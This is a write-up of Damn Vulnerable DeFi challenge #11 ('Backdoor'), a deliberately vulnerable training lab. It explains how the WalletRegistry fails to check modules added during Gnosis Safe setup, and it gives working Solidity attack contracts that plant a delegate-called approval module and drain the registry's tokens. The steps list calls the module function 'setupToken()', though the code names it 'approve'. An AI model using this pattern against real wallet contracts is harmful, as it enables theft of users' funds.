# Damn Vulnerable DeFi Challenge #11 Solution — Backdoor

## Challenge Objective:

The challenge is about exploiting a vulnerability in a DeFi protocol that uses Gnosis Safe wallets. The protocol has a WalletRegistry contract that creates and registers Gnosis Safe wallets for beneficiaries. When a beneficiary's wallet is registered, the registry sends some Damn Valuable Tokens (DVT) to the wallet. The challenge is to steal all the DVT tokens from the WalletRegistry contract.

## Vulnerability:

The vulnerability lies in the way the Gnosis Safe wallets are initialized. The WalletRegistry contract checks if the wallet is correctly initialized, but it doesn't check if any modules were added during the initialization. This allows an attacker to add a malicious module during the initialization of the Gnosis Safe wallet.

## Exploit:

The exploit involves creating a malicious module that approves the attacker to spend the wallet's tokens. The attacker deploys this module during the initialization of the Gnosis Safe wallet. When the WalletRegistry contract sends DVT tokens to the newly created wallet, the attacker can immediately transfer these tokens to their own address using the approval given by the malicious module.

```solidity
import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "../DamnValuableToken.sol";

contract AttackBackdoor {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address[] memory users
    ) {
        // Setup vars
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;

        // Deploy module contract (this is required as it will be delegate called
        // so we cannot call the token contract directly.)
        AttackBackdoorModule abm = new AttackBackdoorModule();

        // Setup module setup data
        string memory setupTokenSignature = "approve(address,address,uint256)";
        bytes memory setupData = abi.encodeWithSignature(
            setupTokenSignature,
            address(this),
            address(token),
            10 ether
            );

        // Loop each user
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(abm),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );

            // Deploy the proxy with all the exploit data in initGnosis
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            // Proxy has approved this contract for transfer in the
            // module setup so we should be able to transfer some ETH
            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}
```

// Backdoor module contract that has to be deployed seperately so
// 1. It is able to called since the above contract's constructor is not complete
// 2. It is delegate called so we cannot call the token approval directly.
contract AttackBackdoorModule {
function approve(address approvalAddress, address token, uint256 amount) public {
DamnValuableToken(token).approve(approvalAddress, amount);
}
}

## Steps:

1. Deploy a malicious module that approves the attacker to spend the wallet's tokens.
2. Generate the ABI to call the setupToken() function in the malicious module.
3. Call the exploit with the above ABI and the list of users.
4. Generate the ABI to setup the new Gnosis wallet with the ABI from step 2, such that the callback address and function is the wallet registry.
5. Call the ProxyFactory contract with the ABI from step 4 and a few other parameters with a callback to the WalletRegistry proxyCreated() function.
6. The ProxyFactory deploys the new Proxy and calls setup() on the proxy.
7. The new proxy is setup and sets up the module calling back to the malicious contract.
8. The setupToken() function approves 10 ether to be spent by the malicious contract of the proxies token funds.
9. The proxyCreated() function is called back on the wallet registry and passes checks and transfers 10 ether to the newly created wallet.
10. Transfer the 10 ether from the Gnosis wallet to the attacker address.
11. Repeat for each beneficiary from within the contract and hence 1 transaction.

## Takeaway:

This challenge highlights the importance of thoroughly checking all aspects of a contract's initialization process. It shows how a seemingly harmless operation (adding a module during initialization) can be exploited to gain control over a contract's assets. It also demonstrates the power of delegate calls and how they can be used to execute arbitrary code in the context of another contract.
